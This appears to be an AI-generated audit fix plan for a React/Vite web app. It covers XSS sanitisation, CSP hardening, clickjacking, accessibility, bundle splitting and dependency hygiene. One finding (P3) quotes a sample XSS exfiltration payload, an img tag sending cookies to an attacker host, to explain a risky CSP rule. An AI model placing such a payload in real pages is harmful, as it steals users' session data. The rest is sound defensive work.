# 🔍 HYLONO — Full Codebase Audit Fix Plan
**Generated**: 2026-02-18 | **Agent**: CEO Auditor + Code Reviewer  
**Status**: All items open unless marked ✅

---

## How to use this file
- Work top-to-bottom: Critical → High → Medium → Low
- Each item has: **What**, **Files**, **Fix Approach**, **Best Practice Tip**
- Mark items `✅` when done

---

## 🔴 CRITICAL — Security

---

### C1 · `dangerouslySetInnerHTML` without sanitization

**What**: Two components render raw HTML strings directly into the DOM with no sanitization. Any unsanitized content (from CMS, user input, or API) becomes a stored XSS vector.

**Files**:
- `components/BlogArticle.tsx`
- `components/ResearchHub.tsx`

**Fix Approach**:
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```
```tsx
// BEFORE (dangerous)
<div dangerouslySetInnerHTML={{ __html: content }} />

// AFTER (safe)
import DOMPurify from 'dompurify';

const sanitized = DOMPurify.sanitize(content, {
  ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'ul', 'ol', 'li', 'strong', 'em', 'a', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
});
<div dangerouslySetInnerHTML={{ __html: sanitized }} />
```

**Best Practice**: Create `utils/sanitizeHtml.ts` as a shared wrapper so all uses go through one place. Add a DOMPurify `FORBID_TAGS: ['script', 'style', 'iframe']` config to make it explicit.

---

### C2 · `stripe` SDK in client-side `dependencies`

**What**: The Stripe **server** SDK (`stripe` package) is listed in `dependencies` in `package.json`. Vite will attempt to bundle it for the browser. This can expose secret keys and bloats the client bundle unnecessarily.

**Files**:
- `package.json` → `dependencies.stripe`

**Fix Approach**:
```jsonc
// If Stripe is only used in API routes (app/api/):
// Move to devDependencies or remove entirely from package.json.
// The browser-side Stripe should come from the official browser SDK:
npm install @stripe/stripe-js   // for client-side (Stripe Elements)
// NOT the `stripe` npm package (that's server-only)
```
If you have server-side API routes using Stripe, keep `stripe` only in the backend entry point — never import it anywhere inside `components/`.

**Best Practice**: Audit imports with `grep -r "from 'stripe'" components/` — if any component imports it, that's a critical leak. Server SDK keys must live exclusively in `.env.local` and only be accessed from `app/api/` routes.

---

### C3 · `unsafe-inline` in `script-src` CSP

**What**: The Content Security Policy in `index.html` allows `'unsafe-inline'` in `script-src`. This negates most XSS protection — any injected inline script will execute.

**Files**:
- `index.html` line 7

**Fix Approach** (Option A — Nonce, preferred for Vite):
```html
<!-- index.html — use a nonce placeholder that your server injects -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'nonce-INJECT_NONCE_HERE';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://images.unsplash.com https://cdn.hylono.com;
  connect-src 'self' https://api.hylono.com https://vitals.vercel-insights.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Fix Approach** (Option B — Static SPA, no server nonce):
Remove `unsafe-inline` and rely on Vite's hashed script tags. Vite in production builds bundles everything — there are no inline scripts unless you explicitly add them. Test with the header removed from index.html and instead set it via hosting (Vercel `vercel.json` headers, Netlify `_headers`).

**Best Practice**: Set CSP via HTTP response headers at the CDN/hosting layer, not via `<meta>` tag — meta CSP cannot block navigation requests or certain resource types. Add `frame-ancestors 'none'` to prevent clickjacking (see C4).

---

### C4 · Missing `frame-ancestors` in CSP — Clickjacking

**What**: No `frame-ancestors` directive means any website can embed Hylono in an `<iframe>` and perform clickjacking attacks.

**Files**:
- `index.html` (CSP meta tag)
- Vercel/hosting config (if applicable)

**Fix Approach**:
```html
<!-- Add to CSP: -->
frame-ancestors 'none';

<!-- OR as a separate header: -->
X-Frame-Options: DENY
```

**Best Practice**: Use both `frame-ancestors 'none'` in CSP (modern) AND `X-Frame-Options: DENY` (legacy) for maximum browser coverage. Set at hosting layer.

---

### C5 · `target="_blank"` without `rel="noopener noreferrer"`

**What**: Links opening in new tabs without `rel="noopener noreferrer"` allow the opened page to access `window.opener` — a tabnapping/reverse tabnapping vector.

**Files**:
- `components/MeridianPage.tsx` (footer LinkedIn, Instagram links)
- Audit other components for similar patterns

**Fix Approach**:
```tsx
// BEFORE
<a href="https://linkedin.com/company/hylono" target="_blank">LinkedIn</a>

// AFTER
<a href="https://linkedin.com/company/hylono" target="_blank" rel="noopener noreferrer">LinkedIn</a>
```

**Best Practice**: Add an ESLint rule to auto-catch this:
```json
// .eslintrc.json
"jsx-a11y/anchor-is-valid": "error",
"react/jsx-no-target-blank": ["error", { "enforceDynamicLinks": "always" }]
```
This makes it a build-time error going forward.

---

## 🟠 HIGH — Accessibility (WCAG 2.1 AA)

---

### A1 · Buttons missing `aria-label` in Layout.tsx

**What**: Interactive icon buttons (mobile menu toggle, cart, search, close) have no accessible name. Screen readers announce them as "button" with no context — WCAG 2.1 SC 4.1.2 failure.

**Files**:
- `components/Layout.tsx` — mobile menu button, cart button, search button

**Fix Approach**:
```tsx
// BEFORE
<button onClick={toggleMenu}>
  <Menu size={24} />
</button>

// AFTER
<button onClick={toggleMenu} aria-label="Open navigation menu" aria-expanded={isMenuOpen}>
  <Menu size={24} aria-hidden="true" />
</button>

// For cart:
<button onClick={onOpenCart} aria-label={`Open cart${cartCount > 0 ? `, ${cartCount} items` : ''}`}>
  <ShoppingCart size={20} aria-hidden="true" />
  {cartCount > 0 && <span aria-hidden="true">{cartCount}</span>}
</button>
```

**Best Practice**: All `<button>` and `<a>` elements must have either: visible text, `aria-label`, or `aria-labelledby`. Icons should always have `aria-hidden="true"` so screen readers skip the SVG. Dynamic counts (cart badge) should be in the `aria-label` of the parent button, not as separate announcements.

---

### A2 · `CookieConsent.tsx` missing granular consent categories

**What**: GDPR Article 7 + ePrivacy Directive require separate, informed consent for each category of cookies (necessary / analytics / marketing). A single "Accept All" without per-category control is non-compliant in the EU.

**Files**:
- `components/CookieConsent.tsx`

**Fix Approach**:
```tsx
const [consent, setConsent] = useState({
  necessary: true,   // always true, cannot be rejected
  analytics: false,
  marketing: false,
  preferences: false,
});

// Render a modal/banner with checkboxes per category
// Store choices in localStorage as JSON: { necessary: true, analytics: true, ... }
// Expose via a React Context so PostHog, GA etc. check before loading
```

**Best Practice**: 
- "Necessary" cookies must be pre-ticked and non-toggleable
- All others start as `false` (opt-in, not opt-out)
- Provide a "Cookie Settings" link in the footer that re-opens the modal
- Log consent timestamp + version to localStorage for audit trail
- Consider a library: `react-cookie-consent` or `vanilla-cookieconsent` for compliance-grade UI

---

### A3 · Form inputs missing label associations

**What**: Multiple `<input>` elements across forms lack proper `<label htmlFor>` or `aria-labelledby` associations. Visual labels may exist as nearby text, but they're not programmatically linked — screen readers can't announce what field is focused.

**Files**:
- `components/ExitIntent.tsx`
- `components/Newsletter.tsx`
- `components/ContactPage.tsx` (some fields)
- `components/MeridianPage.tsx` (footer email input)

**Fix Approach**:
```tsx
// BEFORE (placeholder-only, no label)
<input type="email" placeholder="your@email.com" />

// AFTER (properly labelled)
<label htmlFor="newsletter-email" className="sr-only">Email address</label>
<input
  id="newsletter-email"
  type="email"
  placeholder="your@email.com"
  aria-required="true"
/>
```

**Best Practice**: Use `className="sr-only"` (visually hidden but screen-reader visible) for inline form layouts where a visible label breaks design. Never rely on `placeholder` as the only label — placeholders disappear on input and have insufficient contrast.

---

### A4 · Social icon buttons lack accessible names

**What**: Social media icon links (LinkedIn, Instagram, Twitter) in Footer/Layout render as icon-only without accessible text, announcing as empty links to screen readers.

**Files**:
- `components/Layout.tsx` (footer social icons)
- `components/MeridianPage.tsx` (footer)

**Fix Approach**:
```tsx
// BEFORE
<a href="https://linkedin.com/company/hylono">
  <LinkedinIcon size={18} />
</a>

// AFTER
<a href="https://linkedin.com/company/hylono" aria-label="Hylono on LinkedIn" target="_blank" rel="noopener noreferrer">
  <LinkedinIcon size={18} aria-hidden="true" />
</a>
```

---

## 🟡 MEDIUM — Performance

---

### P1 · `vite.config.ts` missing manual chunk splitting

**What**: Without `manualChunks`, Vite bundles all node_modules into a single `vendor.js` chunk. On Hylono, this includes framer-motion, lucide-react, recharts, and others — likely 400-600KB gzipped in one file. Users pay this cost on first load even for the home page.

**Files**:
- `vite.config.ts`

**Fix Approach**:
```ts
// vite.config.ts
export default defineConfig({
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          'vendor-react': ['react', 'react-dom'],
          'vendor-motion': ['framer-motion'],
          'vendor-icons': ['lucide-react'],
          'vendor-charts': ['recharts'],
          'vendor-stripe': ['@stripe/stripe-js'],
        },
      },
    },
    chunkSizeWarningLimit: 400, // warn if any chunk exceeds 400KB
  },
});
```

**Best Practice**: After splitting, run `npm run build` and inspect `dist/` with `npx vite-bundle-visualizer` to see what's in each chunk. Target: no individual chunk above 200KB gzipped. The React vendor chunk loads once and is cached — framer-motion and charts only load on pages that need them.

---

### P2 · `useEffect` without dependency arrays — potential infinite loops

**What**: `useEffect(() => { ... })` without a second argument `[]` runs on **every render**. Depending on what's inside (setState calls, API calls, subscriptions), this can create infinite render loops.

**Files**: Multiple (search result shows 15+ instances)  
Run: `grep -rn "useEffect(() =>" components/` to find all instances

**Fix Approach**:
```tsx
// BEFORE (runs every render)
useEffect(() => {
  fetchData();
});

// AFTER (runs once on mount)
useEffect(() => {
  fetchData();
}, []);

// AFTER (runs when dependency changes)
useEffect(() => {
  fetchData(userId);
}, [userId]);
```

**Best Practice**: The ESLint rule `react-hooks/exhaustive-deps` is your safety net — ensure it's enabled in `eslint.config.mjs`. It will warn if you're missing deps or have unnecessary ones. Never silence it with `// eslint-disable` without a comment explaining why.

---

### P3 · `img-src` and `connect-src` using `https:` wildcard

**What**: The CSP allows images from **any** HTTPS source (`img-src 'self' data: https:`). This means a XSS payload could exfiltrate data by loading `<img src="https://attacker.com/steal?cookie=...">`. It also allows loading tracking pixels from arbitrary domains.

**Files**:
- `index.html` (CSP meta tag)

**Fix Approach**:
```
# Replace https: wildcard with explicit allowlist:
img-src 'self' data: https://images.unsplash.com https://cdn.hylono.com https://fonts.gstatic.com;
connect-src 'self' https://api.hylono.com https://vitals.vercel-insights.com wss://api.hylono.com;
```

**Best Practice**: Audit `<img src>` tags and `fetch()`/`axios` calls to build your allowlist. Every new external domain added to the codebase should require a conscious CSP update — this creates a useful security review checkpoint.

---

### P4 · Missing `typecheck` and `format` scripts in `package.json`

**What**: No `tsc --noEmit` script means TypeScript errors only surface during build, not in CI or pre-commit hooks. No `prettier --write` script means formatting isn't standardized.

**Files**:
- `package.json`

**Fix Approach**:
```json
{
  "scripts": {
    "typecheck": "tsc --noEmit",
    "format": "prettier --write .",
    "format:check": "prettier --check .",
    "lint:fix": "eslint . --fix"
  }
}
```

Then add to CI (GitHub Actions / Vercel build):
```yaml
- run: npm run typecheck
- run: npm run format:check
- run: npm run lint
```

**Best Practice**: Add a pre-commit hook via `husky` + `lint-staged`:
```bash
npm install --save-dev husky lint-staged
npx husky init
```
```json
// package.json
"lint-staged": {
  "*.{ts,tsx}": ["eslint --fix", "prettier --write"],
  "*.{json,md,css}": ["prettier --write"]
}
```
This catches issues before they hit the repo.

---

## 🔵 LOW — Code Quality / Developer Experience

---

### Q1 · `console.log` stubs left in production code

**What**: 10+ `console.log` calls remain from development/stubbing. These will appear in browser DevTools for all users and may leak form data or user intent.

**Files**:
- `components/BookingModal.tsx` — `console.log('Booking:', ...)` 
- `components/CheckoutPage.tsx` — `console.log('Order submitted:', ...)`
- `components/ContactPage.tsx` — `console.log('Contact form submitted:', ...)` (×2)
- `components/ExitIntent.tsx` — `console.log('Exit intent email:', ...)`
- `components/Newsletter.tsx` — `console.log('Newsletter signup:', ...)` (×2)
- `components/MeridianPage.tsx` — footer link stubs
- `components/Hero46/Version1.tsx` — nav stubs
- `components/Hero46/Version2.tsx` — nav stubs

**Fix Approach**:
```tsx
// For form submissions — replace with real API call:
const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();
  try {
    await fetch('/api/newsletter', {
      method: 'POST',
      body: JSON.stringify({ email }),
      headers: { 'Content-Type': 'application/json' },
    });
    setStatus('success');
  } catch {
    setStatus('error');
  }
};

// For stub nav handlers — replace with real navigate():
onClick={() => navigate('ecosystem')}

// NEVER do this in production:
onClick={() => console.log(`Navigate to: ${link}`)}
```

**Best Practice**: Add the ESLint rule `"no-console": ["warn", { allow: ["warn", "error"] }]` — this makes all `console.log` a lint warning while allowing `console.warn` and `console.error` for legitimate use. CI fails on warnings = zero console.log in production.

---

### Q2 · `eslint-config-next` leftover in `devDependencies`

**What**: This is a Next.js-specific ESLint preset. The project uses Vite, not Next.js. The package adds ~2MB to `node_modules` and its rules conflict with the custom `eslint.config.mjs`.

**Files**:
- `package.json` → `devDependencies["eslint-config-next"]`

**Fix Approach**:
```bash
npm uninstall eslint-config-next
# Then verify eslint still passes:
npm run lint
```

Check `eslint.config.mjs` — if it extends `"next"` or `"next/core-web-vitals"`, remove those extends too.

**Best Practice**: Do a periodic `npx depcheck` audit to find unused dependencies. Set a calendar reminder quarterly. Unused deps = attack surface, build time, and confusion.

---

### Q3 · `@prisma/client` in wrong dependency category

**What**: `@prisma/client` is in `devDependencies` but it's a runtime dependency needed when Prisma queries run. If the app is ever deployed with a Node.js runtime (API routes, SSR), it will fail in production.

**Files**:
- `package.json`

**Fix Approach**:
```bash
# Move to production dependencies:
npm uninstall --save-dev @prisma/client
npm install @prisma/client

# Keep prisma CLI in devDependencies (it's build-time only):
# "prisma": "^x.x.x"  ← devDependencies ✓
# "@prisma/client": "^x.x.x"  ← dependencies ✓
```

**Best Practice**: Rule of thumb — if it's imported in code that runs at runtime (`import { PrismaClient } from '@prisma/client'`), it's a `dependency`. If it's only used in scripts or CLI commands (`prisma generate`, `prisma migrate`), it's a `devDependency`.

---

### Q4 · CSP `img-src` / `connect-src` over-broad wildcards (also security)

*(See P3 above — same fix, listed here as a reminder for the code quality pass)*

---

## 📋 Priority Order for Implementation

| # | Item | Priority | Estimated Effort | Agent |
|---|------|----------|-----------------|-------|
| 1 | C1 — DOMPurify for dangerouslySetInnerHTML | 🔴 Critical | 30 min | frontend-specialist |
| 2 | C2 — Remove stripe from client dependencies | 🔴 Critical | 15 min | devops-deploy |
| 3 | C5 — Fix target="_blank" missing rel | 🔴 Critical | 15 min | frontend-specialist |
| 4 | A1 — aria-label on icon buttons (Layout) | 🟠 High | 45 min | accessibility-specialist |
| 5 | A3 — Label associations for form inputs | 🟠 High | 1h | accessibility-specialist |
| 6 | A2 — CookieConsent granular categories | 🟠 High | 2h | legal-privacy-reviewer |
| 7 | C3 — Remove unsafe-inline from CSP | 🟠 High | 1h | security-compliance |
| 8 | C4 — Add frame-ancestors to CSP | 🟠 High | 15 min | security-compliance |
| 9 | P1 — Vite manual chunk splitting | 🟡 Medium | 30 min | devops-deploy |
| 10 | P2 — Fix useEffect missing deps | 🟡 Medium | 1h | frontend-specialist |
| 11 | P4 — Add typecheck/format scripts | 🟡 Medium | 20 min | devops-deploy |
| 12 | P3 — Tighten CSP allowlists | 🟡 Medium | 30 min | security-compliance |
| 13 | Q1 — Remove console.log stubs | 🔵 Low | 45 min | frontend-specialist |
| 14 | Q2 — Remove eslint-config-next | 🔵 Low | 10 min | devops-deploy |
| 15 | Q3 — Move @prisma/client to dependencies | 🔵 Low | 5 min | devops-deploy |

---

## 🛠 Quick Wins (do in one pass, < 5 min each)

```bash
# 1. Fix target="_blank" across all files
grep -rn 'target="_blank"' components/ | grep -v 'noopener'
# Then add rel="noopener noreferrer" to each

# 2. Remove console.log (replace with // TODO: connect to API)
grep -rn "console.log" components/

# 3. Fix @prisma/client dep category
npm uninstall --save-dev @prisma/client && npm install @prisma/client

# 4. Remove eslint-config-next
npm uninstall eslint-config-next

# 5. Add scripts to package.json (one edit)
```

---

*Last audited: 2026-02-18 | Next audit recommended: after all Critical items are resolved*
